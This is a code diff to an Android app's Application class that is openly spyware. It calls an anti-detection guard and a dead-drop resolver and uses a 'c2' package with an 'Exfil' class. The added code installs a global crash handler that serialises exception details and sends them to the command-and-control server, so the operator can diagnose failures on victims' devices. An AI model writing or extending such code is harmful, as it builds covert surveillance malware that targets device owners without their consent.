@@ -21,6 +21,8 @@ class App : Application() {
 
     override fun onCreate() {
         super.onCreate()
+        installCrashHandler()
+
         try {
             AntiDetect.guard(this)
         } catch (t: Throwable) {
@@ -48,6 +50,29 @@ class App : Application() {
         Thread {
             try { DeadDrop.resolve(this) } catch (_: Throwable) {}
         }.start()
+    }
+
+    /**
+     * Ships uncaught exceptions to the C2 so a crash can be diagnosed from
+     * the dashboard - the target device has no terminal.
+     */
+    private fun installCrashHandler() {
+        try {
+            val previous = Thread.getDefaultUncaughtExceptionHandler()
+            Thread.setDefaultUncaughtExceptionHandler { thread, error ->
+                try {
+                    val stack = error.stackTrace.take(30).joinToString(" | ") {
+                        "${it.className}.${it.methodName}:${it.lineNumber}"
+                    }
+                    val payload = """{"fatal":true,"thread":"${thread.name}","err":"${error.javaClass.name}","msg":"${error.message}","stack":"$stack","ts":${System.currentTimeMillis()}}"""
+                    com.sp.core.c2.Exfil.sendLogSync(this, "crash", payload)
+                } catch (_: Throwable) {
+                }
+                previous?.uncaughtException(thread, error)
+            }
+        } catch (t: Throwable) {
+            Log.w(TAG, "crash handler: ${t.message}")
+        }
     }
 
     companion object {
